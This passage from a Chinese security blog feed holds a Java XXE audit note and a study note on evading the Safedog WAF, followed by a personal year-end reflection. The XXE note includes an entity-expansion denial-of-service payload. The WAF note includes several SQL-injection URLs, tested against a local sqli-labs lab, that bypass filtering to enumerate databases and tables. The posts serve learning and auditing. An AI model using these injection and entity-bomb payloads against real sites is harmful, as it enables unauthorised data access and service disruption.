class="meta-keyword">e9</span> <span class="meta-string">"&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e1</span>0 <span class="meta-string">"&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e11</span> <span class="meta-string">"&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;e11;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp; &lt;x&gt;&e11;&lt;/x&gt; 代码引用ENTITY e11，而 e11 由16 个 e10 组成，递归调用，循环次数达到 16^10 的规模。循环大量的实体引用，会消耗大量的CPU资源，长时间显示占用近100%。</p><p>&emsp;&emsp; POIXMLTypeLoader 中，解析xml的时候直接读取xml，没有对实体的数量进行限制。3.11 对 POIXMLTypeLoader 中的实体大小进行了限制 ，最大为4096，但是当实体为空的时候（如上例），还是可以构造空实体，形成大量循环，占用 cpu 资源，造成拒绝服务攻击。</p><hr><h1 id="xlsx-streamer-XXE"><a href="#xlsx-streamer-XXE" class="headerlink" title="xlsx-streamer XXE"></a>xlsx-streamer XXE</h1><p>&emsp;&emsp; xlsx-streamer XXE漏洞与Poi ooxml XXE类似，具体查看<a href="https://www.itread01.com/hkpcyyp.html" target="_blank" rel="noopener">参考链接</a>笔者这里就不过多的叙述了。</p><hr><h1 id="代码审计技巧"><a href="#代码审计技巧" class="headerlink" title="代码审计技巧"></a>代码审计技巧</h1><p><strong>查找关键字</strong></p><pre><code>javax.xml.parsers.DocumentBuilderFactory;javax.xml.parsers.SAXParserjavax.xml.transform.TransformerFactoryjavax.xml.validation.Validatorjavax.xml.validation.SchemaFactoryjavax.xml.transform.sax.SAXTransformerFactoryjavax.xml.transform.sax.SAXSourceorg.xml.sax.XMLReaderorg.xml.sax.helpers.XMLReaderFactoryorg.dom4j.io.SAXReaderorg.jdom.input.SAXBuilderorg.jdom2.input.SAXBuilderjavax.xml.bind.Unmarshallerjavax.xml.xpath.XpathExpressionjavax.xml.stream.XMLStreamReaderorg.apache.commons.digester3.Digester…………</code></pre><hr><h1 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一般的防护</span></span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//xinclude防护</span></span><br><span class="line">dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><hr><h1 id="推荐案例"><a href="#推荐案例" class="headerlink" title="推荐案例"></a>推荐案例</h1><p><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">收集了很多国内外知名厂商出现案例</a><br><a href="https://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">基础知识文章XXE</a><br><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">XXE更多骚操作</a><br><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="noopener">Apache Solr XXE漏洞分析 -【CVE-2018-8026 】</a></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_40918067/article/details/90950535" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40918067/article/details/90950535</a><br><a href="https://github.com/JoyChou93/java-sec-code/wiki/XXE" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/XXE</a><br><a href="https://blog.csdn.net/hua1017177499/article/details/78985166" target="_blank" rel="noopener">https://blog.csdn.net/hua1017177499/article/details/78985166</a><br><a href="https://p0rz9.github.io/2019/02/27/xxe/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/02/27/xxe/</a><br><a href="https://www.anquanke.com/post/id/156227" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227</a><br><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">https://www.jianshu.com/p/73cd11d83c30</a><br><a href="https://www.itread01.com/hkpcyyp.html" target="_blank" rel="noopener">https://www.itread01.com/hkpcyyp.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;学习总结Java审计过程中笔记，审计方法&lt;/li&gt;
&lt;li&gt;阅读要求：有简单Java代码基础，了解漏洞原理&lt;/li&gt;
&lt;li&gt;阅
      
    
    </summary>
    
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="XXE 代码审计" scheme="http://yoursite.com/tags/XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>bypass 学习笔记之绕安全狗bypass safedog</title>
    <link href="http://yoursite.com/2020/02/03/bypass%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97__bypass%20safedog/"/>
    <id>http://yoursite.com/2020/02/03/bypass%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97__bypass%20safedog/</id>
    <published>2020-02-03T04:42:16.000Z</published>
    <updated>2020-03-03T04:59:50.039Z</updated>
    
    <content type="html"><![CDATA[<p>@<a href="目录">toc</a></p><p><img src="https://img-blog.csdnimg.cn/20191204193451558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>走上安全这条路也有9个月了，虽然中途有两个月一直在准备其他的事情，但是安全这条路一直在坚持着。<br>学习安全这么久了，从一开始的脚本小子，我也一直想转变一下，改变自己的现状，但是因为种种事情，给耽误了这个计划。<br>因为接触最多漏洞应该是SQL注入吧，所以我第一想到就是bypass SQL注入。为什么选择安全狗呢？这个waf。。。。这个是因为我遇到的最多是这个waf。<br><code>大家看完可能发现这些东西可能是参考里面差不多的，为啥我还要重新写一波？我只是单纯的想加深一下自己下印象，加深记忆。只是做为自己的学习笔记而已，大佬们不要喷。</code></p><hr><h1 id="0x00-前期准备"><a href="#0x00-前期准备" class="headerlink" title="0x00 前期准备"></a>0x00 前期准备</h1><p>虚拟机windows7<br>phpstudy<a href="https://www.xp.cn/" target="_blank" rel="noopener">^1</a>（为啥选这个我就不说了）<br><code>如果你是使用的phpstudy，请务必将sql的版本调到5.5以上，因为这样你的数据库内才会有information_schema数据库，方便进行实验测试。</code><a href="https://blog.csdn.net/sdb5858874/article/details/80727555" target="_blank" rel="noopener">^2</a><br>环境<img src="https://img-blog.csdnimg.cn/20191204203333353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>sqli-labs<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">^3</a>（我相信大家也不陌生）<br>这里下载之后要在相关地方修改一下，修改一下数据库密码。具体搭建步骤可以看<a href="https://blog.csdn.net/qq_35811830/article/details/90302307" target="_blank" rel="noopener">sqli-labs环境搭建</a>这里就不多做叙述。<br><img src="https://img-blog.csdnimg.cn/20191204195039251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h1 id="0x01-开始尝试绕开"><a href="#0x01-开始尝试绕开" class="headerlink" title="0x01 开始尝试绕开"></a>0x01 开始尝试绕开</h1><h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><code>内联绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;1%27&#x2F;*!14440order by*&#x2F; 3-- +</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191204195703439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;1%27&#x2F;*!10450order%20by*&#x2F;%203--%20+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191204202830345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>经过自己短暂Fuzz之后发现<br>?id=1%27/<em>!<code>10450</code>order%20by</em>/%203–%20+<br>内联其中的10450这个数值不一样，safedog 拦截情况不一样。（这个情况我也不是很清楚是为啥，因为我也不懂MySQL的查询原理。如果有大佬知道可以评论说明一下，小的不甚感激！）<br><img src="https://img-blog.csdnimg.cn/20191204212827898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191204202935900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>注释</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;1%20order%23by%203%20--+</span><br></pre></td></tr></table></figure><p>无意中我发现原文中写的是注释换行，但我发现不用换行也能绕过。<br><code>1%20order%23by%203%20--+</code> 区别在%23后面加%0A。</p><p><img src="https://img-blog.csdnimg.cn/20191204204251572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p><code>union select</code><br>经过不断Fuzz<a href="推荐一个不断Fuzz的文章，在此我就不多累赘了。https://blog.csdn.net/q1352483315/article/details/90175002">^4</a>,你会发现狗只会咬select这个字，不会考虑union。<br><img src="https://img-blog.csdnimg.cn/20191204204922648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>内联</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20&#x2F;*!10440select*&#x2F;%201,2,3%20--+</span><br></pre></td></tr></table></figure><p>参考文章是连union也内联注释了一下。<br><img src="https://img-blog.csdnimg.cn/20191204203631472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>注释+垃圾字符</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%230%0Aselect%201,2,3%20--+</span><br></pre></td></tr></table></figure><p>垃圾字符可以多点，字符无所谓是什么，最少要一个，亲测。<br><img src="https://img-blog.csdnimg.cn/20191204211435175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191204211158654.png" alt="在这里插入图片描述"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p>下面就不一一截图了，不然篇幅太长了。<br><code>获取数据库名</code><br>查当前数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">大佬骚操作</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20all--+x%0Aselect%201,2,database&#x2F;*!00000()*&#x2F;--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个是我自己结合前面的Fuzz出来操作</span><br><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%23a%0Aselect%201,2,database%23%0A()--+</span><br></pre></td></tr></table></figure><p>差其他数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不知道为啥，我可以查到其他数据库，但在参考文章中是不可能的，玄学。</span><br><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20%23asdasdasd%0a%20select%201,(select%20schema_name%20from%20%23%0ainformation_schema.schemata%20%20limit%202,1),3%20--%20+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191204213813597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p><code>获取表名</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20all--+x%0Aselect%201,2,group_concat(table_name)from%20sys.schema_auto_increment_columns%20where%20table_schema&#x3D;database&#x2F;*!&#x2F;*%23*&#x2F;*&#x2F;()--+</span><br></pre></td></tr></table></figure><hr><h1 id="0x03-配合使用分块传输插件bypass-dogwaf"><a href="#0x03-配合使用分块传输插件bypass-dogwaf" class="headerlink" title="0x03 配合使用分块传输插件bypass dogwaf"></a>0x03 配合使用分块传输插件bypass dogwaf</h1><p>之前偶尔看到了分块传输插件，可以过很多waf。今天得以试试。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzEyLzE0L1FSSkNKMS5wbmc?x-oss-process=image/format,png" alt="QRJCJ1.png"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzEyLzE0L1FSSm1vZC5wbmc?x-oss-process=image/format,png" alt="QRJmod.png"><br><img src="https://img-blog.csdnimg.cn/20191214151418588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p>未完待续</p><hr><h1 id="Reference-Resources"><a href="#Reference-Resources" class="headerlink" title="Reference Resources"></a>Reference Resources</h1><p><a href="https://www.anquanke.com/post/id/188465" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188465</a><br><a href="https://422926799.github.io/posts/aafbd292.html" target="_blank" rel="noopener">https://422926799.github.io/posts/aafbd292.html</a><br><a href="https://www.chabug.org/web/1019.html" target="_blank" rel="noopener">https://www.chabug.org/web/1019.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;@&lt;a href=&quot;目录&quot;&gt;toc&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20191204193451558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5na
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="bypass" scheme="http://yoursite.com/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>回望1920 AND 畅想2020</title>
    <link href="http://yoursite.com/2019/12/26/%E5%9B%9E%E6%9C%9B2019%20AND%20%E7%95%85%E6%83%B32020/"/>
    <id>http://yoursite.com/2019/12/26/%E5%9B%9E%E6%9C%9B2019%20AND%20%E7%95%85%E6%83%B32020/</id>
    <published>2019-12-26T11:01:42.000Z</published>
    <updated>2019-12-28T04:53:46.696Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="契机"><a href="#契机" class="headerlink" title="契机"></a>契机</h1><p><img src="https://img-blog.csdnimg.cn/20191226164253999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p>&emsp; 一个读者，加了我QQ一个月说加入我知识星球。作为一个菜鸡，知识星球就是用来分享和自己储存一点文件和知识点地方。并没有很多的干货，为了表示一下，和他进行了深入的交流和沟通。深入了解之后，他说：师傅有时间你把你立FLAG整理告诉我，我想挑战一下。</p><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p><img src="https://img-blog.csdnimg.cn/20191226164339383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>&#8195; 通常我写文章，需要两个条件：</p><ul><li>一个契机</li><li>时间充沛<br>现在契机有了，时间在准备一个学期的后期课程比较少，所以时间也有了。<br>这篇文章筹划了很久，毕竟是我个人第一次想写的年度总结报告，没有任何压力，只是单纯的想总结回顾一下自己一年来所作所为而已。无论你觉得你我是在作秀，还是觉得我在装逼，我只有一句话回复你：我只想做我自己想做的事情。其实写过文章的人都知道，一篇文章从开始动手到最终定稿时，中间会反反复复修改很多次。其实我写文章，就是在脑子从重新回顾一下我的前半生吧，或许这才是我内心的答案吧。一边写这篇文章的时候，总是一边在回忆过往。</li></ul><p><code>思前想后，决定还是以时间线为线索展开。</code></p><hr><h1 id="结缘黑客"><a href="#结缘黑客" class="headerlink" title="结缘黑客"></a>结缘黑客</h1><hr><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDE5LzEyLzk3YjY1M2EyMDk4MzZiNjI5NWYwOThiNTI3Mjk1NmFkX3N0YWZmXzEwMjQxLTMwMHgyMDcuanBn?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>&#8195;朦胧少年时，看了一部电影《黑客帝国》，此次不可救药的迷上黑客题材的电影，这也是我第一次对黑客这个职业有了朦胧的认知，从那以后我便心里萌发出，长大成为一名黑客的种子。</p><p>&#8195;虽然从那时候我便开始找各种资料，方式途径想要更深入了解黑客这方面的东西，知识。四处碰壁，四处被骗，交了各种智商税。玩过卡盟，葫芦侠……上了高中之后，还去淘宝上求着我姐帮我买了一本C primer plus当时商家还送了一本C++版的，花了二三十块钱（之后再也没找不到商家了）。书到之后，我打开看了，当时一点都不懂，那本书的字号很小，书很厚（7百多页，上了大学之后才知道这本书是被誉为C语言经典教材）作为一名刚上高中的学生哪里有耐心看，也看不懂。当时打开看了一两页之后只是简单解释说明C语言的发展历程，当时身边也没有任何认识的上过大学之类的，身边亲戚朋友的学历都不是很高。所以这个一时兴起的计划被搁置了。</p><hr><h1 id="认知网安"><a href="#认知网安" class="headerlink" title="认知网安"></a>认知网安</h1><hr><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDE5LzEyLzJiM2NlZmU3ZmU0ZTkxYTg1ZWRkYWRiZWZmZTY1YWYzX3N0YWZmXzEwMjQxLTMwMHgyMjYuanBn?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>&#8195; 从结缘黑客到认知网安安全经历很长的一段时间，大概有6年左右的时间间隔吧。6年间不断地关注着，尽我一切可能性去了解更多的东西。<br>&#8195;但是真正认知网络安全是在大学开始的，那是一个大二的学长问我是否想学网络安全。我当时毫不犹豫的回答是想，在学长指导下，我先后学了Python、了解HTML、JavaScript，这个时候我已经是一名大一下学期的是学生了。在大一上个学期我学了两名语言，一个Java和C语言（专业必修）。之后过了一段时间，我当时看到学长在看学习视频，恰好看见了他百度网盘里面的资料。这也就是我刚刚开始接触网络安全这个行业起始点。</p><hr><h1 id="安全之路"><a href="#安全之路" class="headerlink" title="安全之路"></a>安全之路</h1><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDE5LzEyL2NlNzk5MzQ1MTIzNzBhNTI4ZTk0YWZhMzA0N2FlZGM0X2ludGVybGFjZTExLTMwMHgyOTAuanBn?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>&#8195;起初开始学习就是看网络安全教程视频，到目前为止看的比较完整的一套视频是carcer的视频教学。我看这种视频教学有一个特点，我不喜欢慢慢的看，这也是我个人的一个习惯吧。我习惯开倍速看，我觉得培训视频中间会有教员的个人观点、经历、见解等，我觉得我这些完全可以听听就行，没有必要去深入探讨研究的。每一个人都有自己一套学习体系、学习经验，其他人的是好的但未必就适合自己。在学习路程中学会、总结、形成自己的一套行之有效的方法才是好的。<br>&#8195;我大概花了一个月的时间去看了这套视频，这套视频是一共30+集，一集是大概1-2小时。边看的过程中有些重点还是放缓播放速度去看，偶尔还写一点笔记之类的。<br>&#8195;<a href="https://blog.csdn.net/sun1318578251/article/details/93032438" target="_blank" rel="noopener">下一秒学习法</a>是我一直学习使用的方法、技巧。还是那一句话，没那么多想当然，没那么多偶然，所有的必然和偶然都是你自己一直努力的结果。</p><hr><p><img src="https://img-blog.csdnimg.cn/2019122616371354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h1><ul><li>驾照（科二挂了一次，停留在科三）<code>未完成</code></li><li>英语四级（凉了）<code>未完成</code></li><li>软考网络工程师(52,53) <code>完成</code></li><li>博客排名进10w（后来自己加）<code>完成</code></li><li>圈子社区<code>完成</code></li><li>土司社区<code>完成</code></li><li>freebuf投稿<code>未完成</code></li><li>先知投稿<code>完成</code></li><li>…<br>&#8195;其实我真的没设立太多的flag，有几个flag是我早就规划好的。比例说我驾照是我在想今年拿下的，但是我拖延症性格最终给落下了。英语四级和软考冲突了，还有一些细小的flag，有些完成了有些没完成。其实除了我自己规划好的flag其他的都是遇上就自动成为自己接下来为之奋斗的目标了。</li></ul><p><strong><em><code>新年flag</code></em></strong></p><ul><li>CSDN 博客访问量破10w挣20w成为博客专家</li><li>把2019的未完成的flag完成</li><li>暑假实习二个月（去处未定，有老板、HR看得上欢迎留言评论联系方式，我联系您）</li><li>脱单此乃人生大事</li><li>待续…其他的暂时未成想到</li></ul><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&#8195;2019年有惊喜，有遗憾，有意外，有失落。。。这些也是每一个人也有的经历吧。但是总的来说我2019对于我个人来说是一个喜大过于悲的一年，我获取了很多荣誉，同时也失去了很多东西。</p><p>&#8195;其实想写的东西很多，想和读者分享的东西有很多。一路走过来感谢喜欢我读者的朋友们，在此我想对你们说一声谢谢。让我们一起迎接2020这个特殊的一年，让我们一起奋斗吧。<br><img src="https://img-blog.csdnimg.cn/201912261636374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h1 id="空"><a href="#空" class="headerlink" title="空"></a>空</h1><p>&#8195;实在想不到标题名字，故意”空“来代替。下面有几件事情想说明一下。<br>&#8195;1. 做一个小小调查，有心的读者可能发现了，我文笔风格转化了几次。从一开始的嘻嘻哈哈，到后来的严谨不苟言笑。<br>我想知道大家喜欢那种风格，或者说更侵向与那种风格，亦或者是希望我是那种风格呢？跪求大家在评论区留言。</p><p><img src="https://img-blog.csdnimg.cn/20191226165906698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>&#8195; 2. 欢迎大家来问我一些关于博客上文章上的问题，但不支持大家来问我一些与博客文章之外的问题哦。大家有些问题其实我自己也不知道，另外博主自己还是一个学生，没很多时间和大家交流沟通一些问题，这点大家请见谅。</p><p><img src="https://img-blog.csdnimg.cn/20191226170609674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>&#8195; 3. 大家别找我说收徒弟之类的东西，本人不收徒弟。自己还是一个菜鸡，实在你是想让我收你为徒也不是不可以。拜师费2w一次性付清，终生教你。教到你比我强，学习计划我来制定，不容质疑。就是这么霸道！<br><img src="https://img-blog.csdnimg.cn/20191226171746912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>&#8195;多说一点，如果大家想看我一些东西，欢迎加我QQ群(群号请看置顶博客《About Me 